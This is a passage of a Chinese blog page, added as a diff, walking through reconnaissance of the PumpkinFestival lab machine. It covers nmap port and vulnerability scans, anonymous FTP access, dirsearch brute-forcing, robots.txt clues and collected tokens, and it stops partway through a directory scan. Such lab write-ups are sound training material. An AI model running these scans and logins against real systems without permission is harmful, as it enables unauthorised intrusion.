@@ -1,0 +1,794 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PumpkinFestival 靶机信息收集123456789101112┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;PumpkinFestival]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.140      [sudo] password for kali: Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PumpkinFestival 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/09/5c91d82f7083.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="PumpkinFestival 靶机信息收集123456789101112┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;PumpkinFestival]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.140      [sudo] password for kali: Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b772d805540fbd31db5ef0194bc2d49d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e9f423e0f74bc35e5988f2899680969f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/8845d132ce1b430e244256f656870f14_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/23a93894c292b323040b2e3a8432bc6a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4742b3546d447b4f8ae171eeeb0f7ae2_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/beb7a0e22f0634ae079f1821dc4454c2_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e2a67e406386e0128a7ece8a2d79ee85_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/162bba049adaed9a0cb465d6c4d30f1a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ab8a412c4f449a755a9e9ecfe48954cd_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/52fae1ab298d1ab5e1154560858edb71_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/accad25850ad648e119522f39dec495d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b2494b14630868f46bec3ef7e4a9c95f_MD5.png">
+<meta property="article:published_time" content="2023-09-10T06:48:53.000Z">
+<meta property="article:modified_time" content="2023-09-12T09:21:00.923Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/b772d805540fbd31db5ef0194bc2d49d_MD5.png">
+  
+  
+  
+  <title>PumpkinFestival 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PumpkinFestival 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-10 14:48" pubdate>
+          2023年9月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          26k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          214 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PumpkinFestival 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="PumpkinFestival-靶机"><a href="#PumpkinFestival-靶机" class="headerlink" title="PumpkinFestival 靶机"></a>PumpkinFestival 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.140      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 02:47 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> pumpkins.local (192.168.56.140)<br>Host is up (0.00016s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>80/tcp   open  http<br>6880/tcp open  unknown<br>MAC Address: 08:00:27:FA:92:8E (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>
+
+<p>开放了 21, 80, 6880 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo nmap -sT -sV -sC -O -p21,80,6880 192.168.56.140<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 02:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> pumpkins.local (192.168.56.140)<br>Host is up (0.00046s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 2.0.8 or later<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to 192.168.56.106<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 3<br>|      vsFTPd 3.0.2 - secure, fast, stable<br>|_End of status<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_drwxr-xr-x    2 0        0            4096 Jul 12  2019 secret<br>80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Pumpkin Festival &amp;<span class="hljs-comment">#8211; PumpkinToken : 06c3eb12ef2389e2752335...</span><br>|_http-generator: WordPress 4.9.3<br>6880/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 eb:cb:da:b3:be:b6:c8:0a:8b:6e:d5:bc:51:f7:9c:11 (DSA)<br>|   2048 19:6b:6e:d3:8a:fa:a9:73:05:5e:ac:af:28:ff:55:b8 (RSA)<br>|   256 00:a0:f2:8c:5e:a7:7e:7b:7b:d4:72:c3:ad:41:79:3b (ECDSA)<br>|_  256 aa:04:61:9a:ca:19:90:c3:55:3c:<span class="hljs-built_in">fc</span>:cc:1a:05:be:3f (ED25519)<br>MAC Address: 08:00:27:FA:92:8E (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+
+<p>21 端口允许匿名登陆，80 端口是 Apache 搭建的服务，title 中包含了 <code>PumpkinToken</code>，WordPress 4.9.3，操作系统是 Ubuntu。接下来 nmap 漏扫的同时去 ftp 看看文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ ftp 192.168.56.140<br>Connected to 192.168.56.140.<br>220 Welcome to Pumpkin\<span class="hljs-string">&#x27;s FTP service.</span><br><span class="hljs-string">Name (192.168.56.140:kali): anonymous</span><br><span class="hljs-string">331 Please specify the password.</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">230 Login successful.</span><br><span class="hljs-string">Remote system type is UNIX.</span><br><span class="hljs-string">Using binary mode to transfer files.</span><br><span class="hljs-string">ftp&gt; ls</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||28051|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">drwxr-xr-x    2 0        0            4096 Jul 12  2019 secret</span><br><span class="hljs-string">226 Directory send OK.</span><br><span class="hljs-string">ftp&gt; pwd</span><br><span class="hljs-string">Remote directory: /</span><br><span class="hljs-string">ftp&gt; binary</span><br><span class="hljs-string">200 Switching to Binary mode.</span><br><span class="hljs-string">ftp&gt; cd secret</span><br><span class="hljs-string">250 Directory successfully changed.</span><br><span class="hljs-string">ftp&gt; ls</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||57147|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">-rw-r--r--    1 0        0              48 Jul 12  2019 token.txt</span><br><span class="hljs-string">226 Directory send OK.</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cat</span> token.txt <br>PumpkinToken : 2d6dbbae84d724409606eddd9dd71265<br><span class="hljs-comment"># 第一个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<p>拿到了一个<code>PumpkinToken</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo nmap --script=vuln -p21,80,6880 192.168.56.140<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 02:50 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> pumpkins.local (192.168.56.140)<br>Host is up (0.00046s latency).<br><br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>80/tcp   open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>| http-enum: <br>|   /wp-login.php: Possible admin folder<br>|   /: WordPress version: 4.9.3<br>|   /wp-includes/images/rss.png: Wordpress version 2.2 found.<br>|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.<br>|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.<br>|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.<br>|   /wp-login.php: Wordpress login page.<br>|   /wp-admin/upgrade.php: Wordpress login page.<br>|_  /readme.html: Interesting, a readme.<br>6880/tcp open  unknown<br>MAC Address: 08:00:27:FA:92:8E (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>
+
+<p>nmap 漏扫显示了一些 wordpress 的路径和文件。</p>
+<h2 id="Web-查看"><a href="#Web-查看" class="headerlink" title="Web 查看"></a>Web 查看</h2><p><img src="/pic/b772d805540fbd31db5ef0194bc2d49d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>PumpkinTokens can help you get to your pumpkins.</code> 可能是在暗示 <code>PumpkinTokens</code> 的值是密码。不过获得的 <code>PumpkinTokens</code> 有点多啊。同时在这里发现了两个用户名 <code>jack</code>, <code>harry</code></p>
+<p>观察源代码发现</p>
+<p><img src="/pic/e9f423e0f74bc35e5988f2899680969f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PumpkinToken</span> : <span class="hljs-number">45</span>d9ee7239bc6b0bb21d3f8e1c5faa52<br><span class="hljs-comment"># 第二个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<p>不过 nmap 扫出来的标题中也带有 <code>PumpkinToken</code>，这里查看源代码并没有发现</p>
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo dirsearch -u http://192.168.56.140/           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.140/-_23-09-10_03-08-01.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-09-10_03-08-01.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.140/<br><br>[03:08:01] Starting: <br>[03:08:02] 403 -  292B  - /.ht_wsr.txt                                     <br>[03:08:02] 403 -  295B  - /.htaccess.bak1<br>[03:08:02] 403 -  297B  - /.htaccess.sample<br>[03:08:02] 403 -  295B  - /.htaccess.orig<br>[03:08:02] 403 -  295B  - /.htaccess_orig<br>[03:08:02] 403 -  296B  - /.htaccess_extra<br>[03:08:02] 403 -  293B  - /.htaccess_sc<br>[03:08:02] 403 -  294B  - /.htaccessOLD2<br>[03:08:02] 403 -  295B  - /.htaccess.save<br>[03:08:02] 403 -  293B  - /.htaccessOLD<br>[03:08:02] 403 -  285B  - /.htm<br>[03:08:02] 403 -  286B  - /.html<br>[03:08:02] 403 -  293B  - /.htaccessBAK                                    <br>[03:08:02] 403 -  295B  - /.htpasswd_test<br>[03:08:02] 403 -  292B  - /.httr-oauth<br>[03:08:02] 403 -  291B  - /.htpasswds<br>[03:08:03] 403 -  285B  - /.php                                            <br>[03:08:03] 403 -  286B  - /.php3                                           <br>[03:08:21] 301 -  313B  - /img  -&gt;  http://192.168.56.140/img/              <br>[03:08:21] 200 -    1KB - /index.html                                       <br>[03:08:30] 200 -  102B  - /robots.txt                                       <br>[03:08:31] 403 -  294B  - /server-status                                    <br>[03:08:31] 403 -  295B  - /server-status/                                   <br>[03:08:33] 301 -  315B  - /store  -&gt;  http://192.168.56.140/store/          <br>[03:08:35] 301 -  315B  - /users  -&gt;  http://192.168.56.140/users/          <br>[03:08:35] 403 -  287B  - /users/<br></code></pre></td></tr></table></figure>
+
+<p>robots.txt 中的内容如下</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade">User-agent: * <br>Disallow: <span class="hljs-regexp">/wordpress/</span><br>Disallow: <span class="hljs-regexp">/tokens/</span><br>Disallow: <span class="hljs-regexp">/users/</span><br>Disallow: <span class="hljs-regexp">/store/</span>track.txt<br></code></pre></td></tr></table></figure>
+
+<p>访问发现只有 <code>/store/track.txt</code> 可以访问，tokens 和 users 返回 403，wordpress 返回 404。<code>/store/track.txt</code> 的内容如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">Hey Jack<span class="hljs-operator">!</span><br><br>Thanks <span class="hljs-keyword">for</span> choosing our <span class="hljs-keyword">local</span> store. Hope you <span class="hljs-keyword">like</span> the services.<br>Tracking code : <span class="hljs-number">2542</span> <span class="hljs-number">8231</span> <span class="hljs-number">6783</span> <span class="hljs-number">486</span><br><br><span class="hljs-operator">-</span>Regards <br>admin<span class="hljs-variable">@pumpkins</span>.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>
+
+<p>tracking code 不知道怎么利用，先记录下来，这里的邮箱后缀有点意思，感觉可能是这个网站的域名。在 hosts 文件中添加此域名和 IP 的映射。再访问此域名</p>
+<p><img src="/pic/8845d132ce1b430e244256f656870f14_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>有意思，这里又拿到了一个，而且就是 nmap 扫描结果中的那个<code>PumpkinToken</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PumpkinToken</span> : <span class="hljs-number">06</span>c3eb12ef2389e2752335beccfb2080<br><span class="hljs-comment"># 第三个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo dirsearch -u http://pumpkins.local/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/pumpkins.local/-_23-09-10_03-16-02.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-09-10_03-16-02.<span class="hljs-built_in">log</span><br><br>Target: http://pumpkins.local/<br><br>[03:16:02] Starting: <br>[03:16:04] 403 -  292B  - /.ht_wsr.txt                                     <br>[03:16:04] 403 -  295B  - /.htaccess.bak1<br>[03:16:04] 403 -  297B  - /.htaccess.sample<br>[03:16:04] 403 -  295B  - /.htaccess.save<br>[03:16:04] 403 -  295B  - /.htaccess_orig<br>[03:16:04] 403 -  293B  - /.htaccessBAK<br>[03:16:04] 403 -  293B  - /.htaccess_sc<br>[03:16:04] 403 -  294B  - /.htaccessOLD2<br>[03:16:04] 403 -  295B  - /.htaccess.orig<br>[03:16:04] 403 -  293B  - /.htaccessOLD<br>[03:16:04] 403 -  286B  - /.html                                           <br>[03:16:04] 403 -  296B  - 